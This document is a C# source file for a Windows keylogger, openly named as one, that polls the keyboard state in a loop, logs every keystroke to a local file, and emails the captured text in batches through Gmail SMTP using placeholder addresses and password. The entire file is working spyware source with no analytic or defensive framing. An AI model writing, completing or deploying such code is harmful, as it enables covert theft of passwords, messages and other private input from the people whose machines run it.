using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Globalization;
using System.Net;
using System.Net.Mail;

namespace KeyLogger
{
   
    static class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [STAThread]
        static void Main()
        {
            MailAddress addressFrom = new MailAddress("your.keylogger.mail@gmail.com");
            MailAddress addressTo = new MailAddress("to.mail@gmail.com");
            string pass = "keyloger.mail.pass";
            int lengthOfMails = 100;
            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(addressFrom.Address, pass)
            };


            string temp = "";
            while (true)   
            {   
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    bool shift = false;
                    bool capslock = false;
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.ShiftKey ||
                            ((Keys)i) == Keys.Shift || ((Keys)i) == Keys.LShiftKey || ((Keys)i) == Keys.RShiftKey||
                           ((Keys)i) == Keys.Capital || ((Keys)i) == Keys.CapsLock) {continue;}
                        if (((Keys)i) == Keys.Space)
                        {
                            temp += " ";
                            File.AppendAllText("keylogger.log", " ");
                            continue;
                        }
                        if (((Keys)i) == Keys.Enter)
                        {
                            temp += " [E]";
                            File.AppendAllText("keylogger.log", " [E]");
                            continue;
                        }
                        if (((Keys)i) == Keys.Back)
                        {
                            temp += " \n[BS]";
                            File.AppendAllText("keylogger.log", " [BS]");
                            continue;
                        }
                        if (((Keys)i) == Keys.Delete)
                        {
                            temp += " \n[Del]";
                            File.AppendAllText("keylogger.log", " [Del]");
                            continue;
                        }
                        if (((Keys)i) == Keys.Control)
                        {
                            temp += " [Cntrl]";
                            File.AppendAllText("keylogger.log", " [Cntrl]");
                            continue;
                        }
                        if (((Keys)i) == Keys.LMenu || ((Keys)i) == Keys.Menu)
                        {
                            temp += " [Alt]";
                            File.AppendAllText("keylogger.log", " [Alt]");
                            continue;
                        }
                        if (((Keys)i) == Keys.Tab)
                        {
                            temp += " [Tab]";
                            File.AppendAllText("keylogger.log", " [Tab]");
                            continue;
                        }
                        if (((Keys)i) == Keys.Shift || ((Keys)i) == Keys.LShiftKey || ((Keys)i) == Keys.RShiftKey) { continue;}
                        short shiftState = (short)GetAsyncKeyState(16);
                        if ((shiftState & 0x8000) == 0x8000)
                        {
                            shift = true;
                        }
                        capslock = Console.CapsLock;
                        if ((!shift && !capslock) || (shift && capslock))
                        {
                            temp += ((Keys)i).ToString().ToLower();
                            File.AppendAllText("keylogger.log", ((Keys)i).ToString().ToLower());
                        }
                        else
                        {
                            temp += ((Keys)i).ToString().ToUpper();
                            File.AppendAllText("keylogger.log", ((Keys)i).ToString().ToUpper());
                        }
                        
                    }
                }

                if (temp.Length > lengthOfMails)
                {

                    using (var message = new MailMessage(addressFrom, addressTo)
                    {
                        Subject = "KeyLogs",
                        Body = temp
                    })
                    {
                        smtp.Send(message);
                    }

                    temp = "";
                }
            }
        }
    }
}

                                                                                        